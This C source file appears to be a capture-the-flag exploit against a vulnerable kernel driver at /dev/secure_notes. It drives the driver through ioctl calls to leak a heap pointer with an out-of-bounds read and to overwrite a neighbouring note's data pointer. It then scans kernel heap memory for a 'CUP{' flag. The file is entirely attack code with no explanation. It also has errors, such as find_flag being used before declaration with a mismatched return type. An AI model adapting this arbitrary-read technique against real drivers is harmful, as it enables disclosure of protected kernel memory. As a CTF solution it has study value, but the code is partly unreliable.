#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>

void setup(void);
uint64_t create(uint32_t idx, uint32_t size, char* data);
void get(uint32_t idx, uint64_t inToken, uint32_t size, char* data);
void update(uint32_t idx, uint64_t inToken, uint32_t size, char* data);
void delete(uint32_t idx, uint64_t inToken);

typedef struct{
    uint32_t idx;
    char* inData;
    uint32_t inSize;
    char* outData;
    uint32_t outSize;
    uint64_t* token;
} UserRequest;

int fd = 0; // device fd
uint8_t FlagFinded = 0;
#define NOTE_DATA_MAX_SIZE 0x200
#define STATUS_BUFFER_SIZE 0x300

int main() {
    setup();

    // create first chunk and second chunk
    char* data = (char*) malloc(32);
    memset(data, 0, 32);
    memcpy(data, "aaaa", 4);
    uint64_t chunk1 = create(1, 32, data); // size 32 is to create data chunk in same slub-cache when Note struct is placed
    memcpy(data, "bbbb", 4);
    uint64_t chunk2 = create(2, 32, data);
    memcpy(data, "cccc", 4);
    uint64_t chunk3 = create(3, 64, data);

    // get heap pointer
    uint8_t* leak = (uint8_t*) malloc(512);
    get(2, chunk2, 512, leak);
    uint64_t heap_leak = *(uint64_t*)(leak + 8 * 5);
    printf("{+} Heap leak: 0x%llx\n", heap_leak);

    // overwrite second chunk data pointer
    char* payload = (char*) malloc(64);
    uint8_t* out = (uint8_t*) malloc(512);

    memset(payload, 0x61, 32);
    *(uint64_t*)(payload + 32) = 0x3;

for (uint32_t off = 0; off < 0xffffff; off += 0x200) {
        uint64_t addr = heap_leak + off;
        *(uint64_t*)(payload+40) = addr;
        if (addr % 0x100000 == 0) {
            printf("{..} addr = 0x%llx\n", addr);
        }
        
        update(2, chunk2, 48, payload);
        memset(out, 0, 512);
        get(3, chunk3, 512, out);

        int sOff = find_flag(out);

        if (FlagFinded) {
            break;
        }
    }

    if (FlagFinded) { 
        close(fd);
        return 0;
    }

    // in negative direction
    for (uint32_t off = 0; off < 0xffffff; off += 0x200) {
        uint64_t addr = heap_leak - off;
        *(uint64_t*)(payload+40) = addr;
        if (addr % 0x100000 == 0) {
            printf("{..} addr = 0x%llx\n", addr - off);
        }

        update(2, chunk2, 48, payload);
        memset(out, 0, 512);
        get(3, chunk3, 512, out);

        int sOff = find_flag(out);

        if (FlagFinded) {
            break;
        }
    }

    close(fd);
    return 0;
};


void find_flag(uint8_t* out) {
    for (int i = 0; i < 512; i++) {
        if (strstr(out+i, "CUP{"))  {
            printf("%s\n", out+i);
            FlagFinded = 1;
            break;
        }
    }
}

uint64_t create(uint32_t idx, uint32_t size, char* data) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = size;
    req->inData = data;
    req->outData = NULL;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x1001, req);
    printf("{+} create, err = %d\n", err);
    printf("{+} create, access token = %lu\n", *token);
    uint64_t retToken = *token;
    free(token);
    free(req);

    return retToken;
};

void get(uint32_t idx, uint64_t inToken, uint32_t size, char* data) {

    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = 0;
    req->inData = 0;
    req->outData = data;
    req->outSize = size;
    req->token = token;

    int err = ioctl(fd, 0x2002, req);
    //printf("{+} get, err = %d\n", err);
    //printf("{+} get, data = %s\n", data);
    free(req);
    free(token);
};

void update(uint32_t idx, uint64_t inToken, uint32_t size, char* data) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = size;
    req->inData = data;
    req->outData = 0;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x3003, req);
    //printf("{+} update, err = %d\n", err);
    free(req);
};

void delete(uint32_t idx, uint64_t inToken) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = 0;
    req->inData = 0;
    req->outData = 0;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x4004, req);
    //printf("{+} delete, err = %d\n", err);
    free(token);
    free(req);
};


void setup(void) {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    fd = open("/dev/secure_notes", 0);

    if (fd < 0) {
        printf("{-} Error in device open, err = %d\n", fd);
        exit(0);
    }
};